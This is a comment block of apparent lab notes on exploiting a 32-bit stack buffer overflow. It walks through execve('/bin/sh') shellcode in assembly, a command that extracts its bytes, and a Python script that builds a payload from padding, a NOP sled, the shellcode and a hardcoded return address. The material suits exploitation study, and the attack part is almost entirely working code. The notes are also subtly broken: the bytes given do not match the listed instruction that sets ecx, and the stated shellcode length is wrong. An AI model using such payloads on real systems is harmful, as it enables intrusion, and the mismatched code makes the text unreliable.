/* 
1. Assembly code to execute shellcode:

section .text
global _start

_start:
    xor eax, eax            ; clear eax
    push eax                ; push NULL
    push 0x68732f2f         ; push "//sh"
    push 0x6e69622f         ; push "/bin"
    mov ebx, esp            ; ebx -> "/bin/sh"
    push eax                ; push NULL (argv)
    mov ecx, esp            ; ecx -> argv
    xor edx, edx            ; edx -> NULL
    mov al, 11              ; syscall execve
    int 0x80                ; run syscall
----------------------------------------------------------

2. Compile:
    nasm -f elf32 shell.asm -o shell.o
    ld -m elf_i386 shell.o -o shell

3. Obtain the bytecode that can be used in C/C++:
    objdump -d shell | grep '[0-9a-f]:' | grep -oP '[0-9a-f]{2}' | paste -sd '' - | sed 's/../\\x&/g'


RESULT -> \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x31\xd2\xb0\x0b\xcd\x80
-----------------------------------------------------------

4. Then you can use this in the python script:
    shellcode = (
     b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
     b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
     b"\x89\xe2\x31\xd2\xb0\x0b\xcd\x80"
    )
-----------------------------------------------------------

5. Example:
    # Goal: inject shellcode and get a shell

    # Step 1: Buffer padding (fills the 64-byte buffer)
    padding = b"A" * 64

    # Step 2: NOP sled, # NOP instruction (0x90) is a no-operation instruction, 1 byte long 
    THE IDEA is to write on the buffer trying to overwrite the return address
    once the address is overwritten, the program will jump to the NOP sled and then to the shellcode:
    nop_sled = b"\x90" * 16   


    # Step 3: Real shellcode (execve /bin/sh, 23 bytes)
    shellcode = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        b"\x89\xe2\x31\xd2\xb0\x0b\xcd\x80"
    )

    # Step 4: Construct payload combining padding, NOP sled, and shellcode
    payload_body = padding + nop_sled + shellcode

    # Step 5: Construct our made_return_address (must point to somewhere inside NOP sled)
    # Replace this address based on GDB analysis
    return_address = b"\x90\xfa\xff\xbf"    # Example: 0xbffffa90 (little endian!!!!)

    # Step 6: PUT ALL TOGETHER for the exploit (payload + return_address)
    exploit = payload_body +  b"B" * (128 - len(payload_body)) + return_address
    # The "B" padding is to fill the rest of the buffer (128 bytes total), u gotta 
    # check with GDB for the right offset to the return address



    # Step 7: Output to check the "bullet"
    with open("payload.bin", "wb") as f:
        f.write(exploit)

    // says "the bullet is in the chamber, ready to fire"
    print(f"[+] Payload written to payload.bin ({len(exploit)} bytes)")
*/